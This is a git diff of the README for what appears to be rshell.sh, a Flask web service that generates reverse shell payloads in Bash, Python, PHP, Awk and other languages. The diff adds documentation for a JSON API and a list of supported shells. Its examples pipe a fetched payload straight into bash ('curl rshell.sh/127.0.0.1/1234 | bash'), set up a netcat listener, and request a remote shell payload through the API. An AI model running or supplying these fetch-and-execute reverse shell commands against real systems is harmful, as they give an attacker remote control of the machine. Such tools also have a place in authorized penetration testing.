@@ -7,7 +7,10 @@
 This project is multi-language reverse shell payload generator written in
 Python3 using the Flask web framework. The point is to make it easy to quickly
 pull reverse shell payloads down from the *cloud* ☁️  to your terminal using
-`curl` or `wget`.
+`curl` or `wget`. It also supports a robust JSON API to help the user integrate
+automated remote reverse shell payload generation into their own applications.
+
+## Basic Usage Info
 
 ### Example Usecase
 
@@ -23,7 +26,7 @@ nc -lvnp 1234
 curl rshell.sh/127.0.0.1/1234 | bash
 ```
 
-## Languages Covered
+### Languages Covered
 
 * Bash
 * Python
@@ -31,7 +34,30 @@ curl rshell.sh/127.0.0.1/1234 | bash
 * PHP
 * Awk
 
+### Shells Covered
+
+* bash
+* csh
+* ksh
+* zsh
+
+### API
+
+```
+curl -X POST https://rshell.sh/api \
+    -H "Content-Type: application/json" \
+    -sd '{"host":"10.0.0.1", "port":1234, "lang":"python", "shell":"zsh"}'
+```
+
+### Help Page
+
 See the project __[help page](https://rshell.sh/help)__ for more information.
+
+You can also read the help page in your terminal!
+
+```
+curl rshell.sh/help | less
+```
 
 ## Dev Site Install / Setup
 
